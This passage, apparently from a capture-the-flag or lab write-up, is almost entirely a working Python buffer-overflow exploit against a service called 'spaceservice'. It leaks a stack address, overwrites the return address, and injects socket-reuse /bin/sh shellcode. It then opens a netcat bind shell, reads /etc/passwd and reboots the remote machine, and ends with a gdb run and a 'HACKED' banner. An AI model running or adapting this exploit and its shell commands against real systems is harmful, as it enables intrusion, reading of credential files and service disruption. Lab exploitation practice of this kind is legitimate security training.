0xffffd1a5     d5 ff ff 60 d5 ff ff 6f d5 ff ff b7 d5 ff ff d0    ...`...o........
```
Everything is fine, remove the \xcc from the script and launch the final movement.. !et voilà échec et mat¡
```python

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

sleep(1)
print(s.recv(1024))
sleep(1)
s.send(leakbuff)
sleep(1)
data = s.recv(1024)
print(":".join("{:02x}".format(ord(c)) for c in data))
buff_addr = data[512:]
buff_addr = buff_addr[:4]
print("exploiting....")
print(":".join("{:02x}".format(ord(c)) for c in buff_addr))


# http://shell-storm.org/shellcode/files/shellcode-881.php
# 50 bytes
# Socket Re-use Combo for linux x86 systems by ZadYree -- 50 bytes
# <zadyree@tuxfamily.org>
# Made using sockfd trick + dup2(0,0), dup2(0,1), dup2(0,2) +
shellcode = '\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6'
shellcode += '\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80'
shellcode += '\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6'
shellcode += '\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e'
shellcode += '\x89\xe3\x31\xc9\xcd\x80'

buffer = '\x41' * 528
buffer +='\x21\x91\x04\x08' #0x08049121
buffer += '\x90' * 20
buffer += shellcode
print(":".join("{:02x}".format(ord(c)) for c in buffer))

sleep(1)
s.send(buffer)
sleep(1)


s.send("nohup nc -lvp 9999 -e /bin/sh &\n")
sleep(2)
s.send("uname -a\n")
sleep(2)
print(s.recv(1024))
s.send("id\n")
sleep(2)
print(s.recv(1024))
s.send("cat /etc/passwd\n")
sleep(4)
print(s.recv(9024))
raw_input("Press Enter to reboot the machine...")
print("\n\nrebooting the remote machine!\n\n")
s.send("reboot\n")
sleep(4)

s.close()
```
```sh
gef➤  run
Starting program: /home/kali/Desktop/spaceservice_b0f/spaceservice 
0xFFFFCE8C
0xFFFFCE8C
process 1927 is executing new program: /usr/bin/dash
[Detaching after fork from child process 1929]
[Detaching after fork from child process 1931]
[Detaching after fork from child process 1932]
[Detaching after fork from child process 1933]

 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄  ▐██▌ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌ ▐██▌ 
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌ ▐██▌ 
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌ ▓██▒ 
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓  ▒▄▄  
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒▒▓  ▒  ░▀▀▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒  ░  ░ 
 ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░    ░ ░  ░     ░ 
 ░  ░  ░      ░  ░░ ░      ░  ░      ░  ░   ░     ░    
                  ░                       ░            


```